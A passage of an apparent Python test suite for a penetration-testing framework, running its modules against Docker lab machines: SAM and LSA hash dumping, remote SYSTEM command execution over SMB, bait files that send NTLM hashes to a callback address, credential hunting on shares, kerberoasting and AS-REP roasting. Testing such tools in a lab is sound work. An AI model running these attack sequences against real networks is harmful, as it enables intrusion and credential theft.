                conn.login("labadmin", "Labpass2024!")
                conn.close()
                break
            except Exception:
                time.sleep(5)
        else:
            cls.manager.down("windows")
            raise RuntimeError("windows lab guest SMB not up within 300s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("windows")

    def test_profile_hardened_windows(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/scanner/ad_probe",
                    f"set RHOSTS {HOST}",
                    "set RPORT 1445",
                    "set RPC_PORT 10135",
                    "set USERNAME labadmin",
                    "set PASSWORD Labpass2024!",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("Windows Server 2022 Build 20348", out)
            self.assertIn("SMB signing NOT required", out)
            # the hardened-EPM fallback: direct binds, PrinterBug present
            self.assertIn("rpc RPRN (PrinterBug)", out)
            self.assertIn("rpc SCMR", out)
            self.assertIn("rpc TSCH", out)
            # this guest runs no EFS service — PetitPotam is absent
            self.assertNotIn("EFSR", out)
            loot = console.store.loot("ad-probe")
            self.assertEqual(len(loot), 1)
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestSamDumpLab(unittest.TestCase):
    """sam_dump against the windows lab: real NT hashes (labadmin's hash
    verified against MD4), LSA secrets, remote cleanup verified."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("windows")
        deadline = time.time() + 300
        while time.time() < deadline:
            try:
                conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
                conn.login("labadmin", "Labpass2024!")
                conn.close()
                break
            except Exception:
                time.sleep(5)
        else:
            cls.manager.down("windows")
            raise RuntimeError("windows lab guest SMB not up within 300s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("windows")

    def test_sam_and_lsa_dump(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/attack/sam_dump",
                    f"set RHOSTS {HOST}",
                    "set RPORT 1445",
                    "set USERNAME labadmin",
                    "set PASSWORD Labpass2024!",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            # the hashes are REAL — labadmin's NT hash must match MD4
            from Cryptodome.Hash import MD4
            h = MD4.new()
            h.update("Labpass2024!".encode("utf-16-le"))
            self.assertIn(h.hexdigest(), out)
            self.assertIn("labadmin:1000:", out)
            self.assertIn("Administrator:500:", out)
            hashes = console.store.loot("hash")
            self.assertEqual(len(hashes), 5)
            # LSA: dockur's autologon password lands in the secrets
            self.assertIn("Labpass2024!", out)
            lsa = console.store.loot("lsa")
            self.assertEqual(len(lsa), 1)
            # nothing left behind in C:\Windows\Temp
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
            conn.login("labadmin", "Labpass2024!")
            try:
                names = {e.get_longname()
                         for e in conn.listPath("ADMIN$", r"Temp\fz_*")}
            except Exception:
                names = set()  # no match = nothing left behind
            conn.close()
            self.assertFalse(any(n.endswith(".tmp") for n in names),
                             f"hives left behind: {names}")
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestSmbExecWindowsLab(unittest.TestCase):
    """smb_exec against the windows lab: SYSTEM command execution through
    a transient SCMR service, output read back over ADMIN$."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("windows")
        deadline = time.time() + 300
        while time.time() < deadline:
            try:
                conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
                conn.login("labadmin", "Labpass2024!")
                conn.close()
                break
            except Exception:
                time.sleep(5)
        else:
            cls.manager.down("windows")
            raise RuntimeError("windows lab guest SMB not up within 300s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("windows")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.loot("exec")
        finally:
            console.store.close()

    def _set_base(self):
        return (
            "use exploits/windows/smb_exec",
            f"set RHOSTS {HOST}",
            "set RPORT 1445",
            "set USERNAME labadmin",
            "set PASSWORD Labpass2024!",
        )

    def test_whoami_as_system(self):
        out, loot = self._run(*self._set_base(), "run")
        self.assertNotIn("Traceback", out)
        self.assertIn("nt authority\\system", out)
        self.assertEqual(len(loot), 1)
        self.assertIn("nt authority\\system", loot[0]["content"])

    def test_metachar_command_autowrapped(self):
        out, loot = self._run(*self._set_base(),
                              "set COMMAND hostname & whoami", "run")
        self.assertNotIn("Traceback", out)
        self.assertIn("nt authority\\system", out)
        # hostname output is the line before whoami
        lines = [l.strip() for l in out.splitlines()]
        idx = next(i for i, l in enumerate(lines)
                   if "nt authority\\system" in l)
        self.assertTrue(lines[idx - 1].strip(),
                        "no hostname line before whoami output")

    def test_check_reports_psexecable(self):
        out, _ = self._run(*self._set_base(), "check")
        self.assertNotIn("Traceback", out)
        self.assertIn("psexec-able", out)

    def test_bad_password_clean_error(self):
        out, loot = self._run(
            "use exploits/windows/smb_exec",
            f"set RHOSTS {HOST}",
            "set RPORT 1445",
            "set USERNAME labadmin",
            "set PASSWORD wrong-password",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("SMB login failed", out)
        self.assertEqual(loot, [])


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestSmbEnumLab(unittest.TestCase):
    """smb_enum against the real Samba lab container."""

    SMB_PORT = 10445

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("smb")
        deadline = time.time() + 30
        while time.time() < deadline:
            try:
                SMBConnection(HOST, HOST, sess_port=cls.SMB_PORT, timeout=2).close()
                break
            except Exception:
                time.sleep(0.5)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("smb")

    def test_smb_enum_finds_shares_and_signing(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/scanner/smb_enum",
                    f"set RHOSTS {HOST}",
                    f"set RPORT {self.SMB_PORT}",
                    "set USERNAME labuser",
                    "set PASSWORD labpass",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertIn("signing NOT required", out)
            self.assertIn("public", out)
            self.assertIn("labuser", out)
            loot = console.store.loot("smb-shares")
            self.assertEqual(len(loot), 1)
            self.assertIn("public", loot[0]["content"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestSpiderLab(unittest.TestCase):
    """share_spider against the smb lab's planted interesting files."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("smb")
        deadline = time.time() + 30
        while time.time() < deadline:
            try:
                SMBConnection(HOST, HOST, sess_port=10445, timeout=2).close()
                break
            except Exception:
                time.sleep(0.5)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("smb")

    def test_flags_planted_files(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/share_spider",
                    f"set RHOSTS {HOST}",
                    "set RPORT 10445",
                    "set USERNAME labuser",
                    "set PASSWORD labpass",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("web.config", out)
            self.assertIn("credentials.txt", out)
            self.assertNotIn("flag.txt", out)  # not an interesting pattern
            # write probe: public is read-only, labuser is the drop target
            self.assertIn("public: READ", out)
            self.assertIn("labuser: READ/WRITE", out)
            loot = console.store.loot("spider")
            self.assertEqual(len(loot), 1)
            self.assertIn("web.config", loot[0]["content"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestHashBaitLab(unittest.TestCase):
    """hash_bait against the smb lab: drop, verify, clean — and a clean
    denial on the read-only guest share."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("smb")
        deadline = time.time() + 30
        while time.time() < deadline:
            try:
                SMBConnection(HOST, HOST, sess_port=10445, timeout=2).close()
                break
            except Exception:
                time.sleep(0.5)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("smb")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.loot("bait")
        finally:
            console.store.close()

    def test_drop_and_clean(self):
        out, loot = self._run(
            "use auxiliary/attack/hash_bait",
            f"set RHOSTS {HOST}",
            "set RPORT 10445",
            "set USERNAME labuser",
            "set PASSWORD labpass",
            "set SHARE labuser",
            "set CALLBACK 10.10.14.5",
            "run",
        )
        self.assertNotIn("Traceback", out)
        for kind in ("scf", "url", "xml"):
            self.assertIn(f"@bait.{kind}", out)
        self.assertIn("responder", out)
        self.assertEqual(len(loot), 1)
        self.assertIn("callback=10.10.14.5", loot[0]["content"])

        out, _ = self._run(
            "use auxiliary/attack/hash_bait",
            f"set RHOSTS {HOST}",
            "set RPORT 10445",
            "set USERNAME labuser",
            "set PASSWORD labpass",
            "set SHARE labuser",
            "set CLEAN true",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("3/3 bait file(s) removed", out)
        # nothing left behind on the share
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(HOST, HOST, sess_port=10445, timeout=10)
        conn.login("labuser", "labpass")
        names = {e.get_longname()
                 for e in conn.listPath("labuser", "\\*")}
        conn.close()
        self.assertFalse(any(n.startswith("@bait.") for n in names),
                         f"bait files left behind: {names}")

    def test_read_only_share_clean_denial(self):
        out, loot = self._run(
            "use auxiliary/attack/hash_bait",
            f"set RHOSTS {HOST}",
            "set RPORT 10445",
            "set USERNAME labuser",
            "set PASSWORD labpass",
            "set SHARE public",
            "set CALLBACK 10.10.14.5",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("drop failed", out)
        self.assertEqual(loot, [])


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestCredHuntLab(unittest.TestCase):
    """cred_hunt against the smb lab's planted fixtures: real hits found,
    placeholder decoys dropped."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("smb")
        deadline = time.time() + 30
        while time.time() < deadline:
            try:
                SMBConnection(HOST, HOST, sess_port=10445, timeout=2).close()
                break
            except Exception:
                time.sleep(0.5)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("smb")

    def test_fixture_hits_and_decoys(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/cred_hunt",
                    f"set RHOSTS {HOST}",
                    "set RPORT 10445",
                    "set USERNAME labuser",
                    "set PASSWORD labpass",
                    "set SHARES public",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            # the four planted real hits
            self.assertIn("private key block", out)
            self.assertIn("r34lEnvS3cret!", out)
            self.assertIn("unattend autologon password", out)
            self.assertIn("D3ploy!Lab2024", out)
            self.assertIn("Str0ng!DbPass99", out)
            # decoys must NOT surface
            self.assertNotIn("changeme", out)
            self.assertNotIn("API_KEY_FROM_VAULT", out)
            self.assertNotIn("DB_PASS}", out)
            loot = console.store.loot("cred-hunt")
            self.assertEqual(len(loot), 1)
            self.assertIn("CRITICAL", loot[0]["content"])
        finally:
            console.store.close()


def up_ad_lab(manager, timeout=120):
    """Bring up the ad lab and wait for a REAL LDAP bind — docker-proxy
    accepts TCP connections the moment the container starts, long before
    provisioning finishes, so a bare connect check lies."""
    from impacket.ldap import ldap as impacket_ldap

    manager.up("ad")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            conn = impacket_ldap.LDAPConnection("ldap://127.0.0.1")
            conn.login("Administrator", "P@ssw0rd123", "forge.local")
            return
        except Exception:
            time.sleep(2)
    manager.down("ad")
    raise RuntimeError("AD lab did not provision within %ss" % timeout)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestDnsReconLab(unittest.TestCase):
    """dns_recon against the AD lab's Samba DNS (15353)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            out = buf.getvalue()
            hosts = [h["address"] for h in console.store.hosts()]
            loot = console.store.loot("dns")
            return out, hosts, loot
        finally:
            console.store.close()

    def test_a_lookup_feeds_hosts(self):
        out, hosts, _ = self._run(
            "use auxiliary/enum/dns_recon",
            f"set RHOSTS {HOST}",
            "set RPORT 15353",
            "set TARGET forge.local",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("forge.local. 900 A", out)
        import re
        m = re.search(r"forge\.local\.\s+\d+\s+A\s+(\d+\.\d+\.\d+\.\d+)", out)
        self.assertIsNotNone(m, f"no A record parsed from: {out}")
        self.assertIn(m.group(1), hosts)

    def test_addiscover_srv_set(self):
        out, _, loot = self._run(
            "use auxiliary/enum/dns_recon",
            f"set RHOSTS {HOST}",
            "set RPORT 15353",
            "set TARGET forge.local",
            "set ADDISCOVER true",
            "run",
        )
        self.assertNotIn("Traceback", out)
        for needle in ("_ldap._tcp.dc._msdcs", "389", "_kerberos._tcp",
                       "_gc._tcp", "3268", "_kpasswd._tcp"):
            self.assertIn(needle, out)
        self.assertEqual(len(loot), 4)

    def test_nxdomain_clean(self):
        out, _, _ = self._run(
            "use auxiliary/enum/dns_recon",
            f"set RHOSTS {HOST}",
            "set RPORT 15353",
            "set TARGET ghost.forge.local",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("NXDOMAIN", out)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestAdEnumLab(unittest.TestCase):
    """ad_enum against the Samba AD DC lab (provisions on first boot)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_ad_enum_collates_domain(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/ad_enum",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertIn("analyst", out)
            self.assertIn("backup_svc", out)
            self.assertIn("KERBEROASTABLE", out)
            self.assertIn("Domain Admins: Administrator", out)
            self.assertIn("policy:", out)
            # machine accounts must not appear in the user list
            users = console.store.loot("ad-users")
            self.assertEqual(len(users), 1)
            self.assertIn("analyst", users[0]["content"])
            for line in users[0]["content"].splitlines():
                self.assertFalse(line.rstrip("\t").endswith("$"),
                                 f"machine account leaked into users: {line}")
            # kerberoastable loot records the SPN itself
            roast = console.store.loot("kerberoastable")
            self.assertEqual(len(roast), 2)  # backup_svc + web_svc fixtures
            contents = "\n".join(r["content"] for r in roast)
            self.assertIn("backup_svc", contents)
            self.assertIn("HTTP/web.forge.local", contents)
            self.assertIn("web_svc", contents)
            self.assertIn("HTTP/intranet.forge.local", contents)
            creds = console.store.creds()
            self.assertEqual(len(creds), 1)
            self.assertEqual(creds[0]["service"], "ldap")
        finally:
            console.store.close()

    def _run_enum(self, *commands):
        """Run ad_enum through a throwaway console; return (output, creds)."""
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.creds()
        finally:
            console.store.close()

    def test_bad_credentials_clean_error(self):
        out, creds = self._run_enum(
            "use auxiliary/enum/ad_enum",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD wrong-password",
            "run",
        )
        self.assertIn("bind", out.lower())
        self.assertIn("failed", out.lower())
        self.assertEqual(creds, [])

    def test_anonymous_bind_graceful(self):
        # Samba AD allows the bind but restricts searches — either way the
        # module must complete cleanly and say what happened
        out, _ = self._run_enum(
            "use auxiliary/enum/ad_enum",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "run",
        )
        self.assertIn("anonymous", out)
        self.assertNotIn("Traceback", out)

    def test_unreachable_dc_clean_error(self):
        out, _ = self._run_enum(
            "use auxiliary/enum/ad_enum",
            "set RHOSTS 127.0.0.2",  # nothing listens on 389 there
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD P@ssw0rd123",
            "run",
        )
        self.assertIn("failed", out.lower())
        self.assertNotIn("Traceback", out)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestRoastLab(unittest.TestCase):
    """kerberoast + asreproast against the AD lab (has SPN + no-preauth fixtures)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.loot("hash")
        finally:
            console.store.close()

    def test_kerberoast_low_priv_user(self):
        # analyst is a normal user — proof that any domain cred roasts
        out, hashes = self._run(
            "use auxiliary/attack/kerberoast",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "run",
        )
        self.assertIn("$krb5tgs$", out)
        self.assertIn("backup_svc", out)
        self.assertEqual(len(hashes), 2)  # backup_svc + web_svc fixtures
        labels = " ".join(h["label"] for h in hashes)
        self.assertIn("backup_svc", labels)
        self.assertIn("web_svc", labels)

    def test_targeted_roast_and_cleanup(self):
        # TARGETED mode: Administrator plants a throwaway SPN on analyst
        # (who has no SPNs), roasts it, and the plant is gone afterwards
        out, hashes = self._run(
            "use auxiliary/attack/kerberoast",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD P@ssw0rd123",
            "set TARGET analyst",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("planted throwaway SPN fzr/", out)
        self.assertIn("$krb5tgs$", out)
        self.assertEqual(len(hashes), 1)
        self.assertIn("analyst", hashes[0]["label"])
        # cleanup really happened: analyst has no SPNs left in the directory
        from impacket.ldap import ldap as impacket_ldap
        from impacket.ldap import ldapasn1
        conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
        conn.login("Administrator", "P@ssw0rd123", "forge.local")
        spns = None
        for packet in conn.search(
                searchBase="DC=forge,DC=local",
                searchFilter="(sAMAccountName=analyst)",
                attributes=["servicePrincipalName"]):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                attrs = {str(a["type"]): [str(v) for v in a["vals"]]
                         for a in packet["attributes"]}
                spns = attrs.get("servicePrincipalName", [])
        conn.close()
        self.assertEqual(spns, [])

    def test_targeted_denied_cleanly(self):
        # analyst has no write over backup_svc — the module must report
        # the denial plainly and produce no hash
        out, hashes = self._run(
            "use auxiliary/attack/kerberoast",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "set TARGET backup_svc",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("SPN write failed", out)
        self.assertEqual(len(hashes), 0)

    def test_asreproast_hits_no_preauth_account(self):
        # The lab flips all three Samba switches ([kdc] require-preauth=no
        # + DONT_REQ_PREAUTH on noauth AND krbtgt), so the roast works:
        # noauth yields a hash, analyst (healthy) is skipped.
        out, hashes = self._run(
            "use auxiliary/attack/asreproast",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERS noauth,analyst",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("1/2 roastable", out)
        self.assertEqual(len(hashes), 1)
        self.assertIn("noauth", hashes[0]["label"])
        self.assertTrue(hashes[0]["content"].startswith("$krb5asrep$23$"))
        # the hash is REAL — it decrypts with NT(Noauth2024!)
        from Cryptodome.Hash import MD4
        from impacket.krb5.crypto import _enctype_table, Key
        from impacket.krb5.asn1 import EncASRepPart
        from pyasn1.codec.der import decoder
        parts = hashes[0]["content"].split("$")
        blob = bytes.fromhex(parts[3].split(":", 1)[1]) + bytes.fromhex(parts[4])
        md4 = MD4.new()
        md4.update("Noauth2024!".encode("utf-16-le"))
        plain = _enctype_table[23].decrypt(Key(23, md4.digest()), 3, blob)
        decoder.decode(plain, asn1Spec=EncASRepPart())


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestDelegationLab(unittest.TestCase):
    """delegation against the AD lab's delegation fixtures."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.loot("delegation")
        finally:
            console.store.close()

    def test_finds_all_delegation_kinds(self):
        # analyst is a normal user — any domain cred can read delegation
        out, loot = self._run(
            "use auxiliary/enum/delegation",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("unconstrained", out)
        self.assertIn("constrained (protocol transition)", out)
        self.assertIn("rbcd-target", out)
        self.assertIn("HTTP/api.forge.local", out)
        # healthy accounts are not flagged
        self.assertNotIn("analyst:", out)
        # loot collates per account
        by_label = {entry["label"].split(" @ ")[0]: entry["content"]
                    for entry in loot}
        self.assertIn("backup_svc", by_label)
        self.assertIn("web_svc", by_label)
        self.assertIn("unconstrained", by_label["backup_svc"])
        self.assertIn("rbcd-target", by_label["backup_svc"])
        self.assertIn("constrained (protocol transition)", by_label["web_svc"])

    def test_unreachable_dc_clean_error(self):
        out, _ = self._run(
            "use auxiliary/enum/delegation",
            "set RHOSTS 127.0.0.2",  # nothing listens on 389 there
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD P@ssw0rd123",
            "run",
        )
        self.assertIn("failed", out.lower())
        self.assertNotIn("Traceback", out)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestLdapQueryLab(unittest.TestCase):
    """ldap_query against the AD lab: real filters, clean failures."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.loot("ldap-query")
        finally:
            console.store.close()

    def test_filter_and_attrs(self):
        out, loot = self._run(
            "use auxiliary/enum/ldap_query",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "set QUERY (sAMAccountName=backup_svc)",
            "set ATTRS sAMAccountName,servicePrincipalName",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("sAMAccountName=backup_svc", out)
        self.assertIn("servicePrincipalName=HTTP/web.forge.local", out)
        self.assertIn("1 entry", out)
        self.assertEqual(len(loot), 1)
        self.assertIn("backup_svc", loot[0]["content"])

    def test_limit_caps_results(self):
        out, _ = self._run(
            "use auxiliary/enum/ldap_query",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "set QUERY (objectClass=user)",
            "set LIMIT 2",
            "run",
        )
        self.assertIn("2 entries", out)

    def test_bad_filter_clean_error(self):
        out, _ = self._run(
            "use auxiliary/enum/ldap_query",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "set QUERY ((objectClass=user)",
            "run",
        )
        self.assertIn("Bad QUERY", out)
        self.assertNotIn("Traceback", out)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestAdGroupsLab(unittest.TestCase):
    """ad_groups against the AD lab (Helpdesk fixture has analyst)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.loot("ad-groups")
        finally:
            console.store.close()

    def test_groups_and_membership(self):
        out, loot = self._run(
            "use auxiliary/enum/ad_groups",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("Domain Admins", out)
        self.assertIn("Helpdesk", out)
        # fixture membership: analyst is in Helpdesk; CN comes from the DN
        self.assertIn("Ana Lyst", out)
        self.assertIn("security", out)
        self.assertEqual(len(loot), 1)
        self.assertIn("Helpdesk", loot[0]["content"])
        self.assertIn("Ana Lyst", loot[0]["content"])

    def test_match_narrows_results(self):
        out, _ = self._run(
            "use auxiliary/enum/ad_groups",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "set MATCH help",
            "run",
        )
        self.assertIn("Helpdesk", out)
        self.assertNotIn("Domain Admins (", out)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestAdDescriptionsLab(unittest.TestCase):
    """ad_descriptions against the AD lab (backup_svc fixture leaks its
    password in the description field, as admins do)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.loot("ad-descriptions")
        finally:
            console.store.close()

    def test_flags_password_in_description(self):
        out, loot = self._run(
            "use auxiliary/enum/ad_descriptions",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("backup_svc", out)
        self.assertIn("CHECK THIS", out)
        self.assertEqual(len(loot), 1)
        self.assertIn("Backup2024!", loot[0]["content"])

    def test_match_narrows_results(self):
        out, loot = self._run(
            "use auxiliary/enum/ad_descriptions",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "set MATCH nightly",
            "run",
        )
        self.assertIn("backup_svc", out)
        self.assertEqual(len(loot), 1)
        self.assertNotIn("analyst", loot[0]["content"])


@unittest.skipUnless(docker_available(), "docker daemon not available")
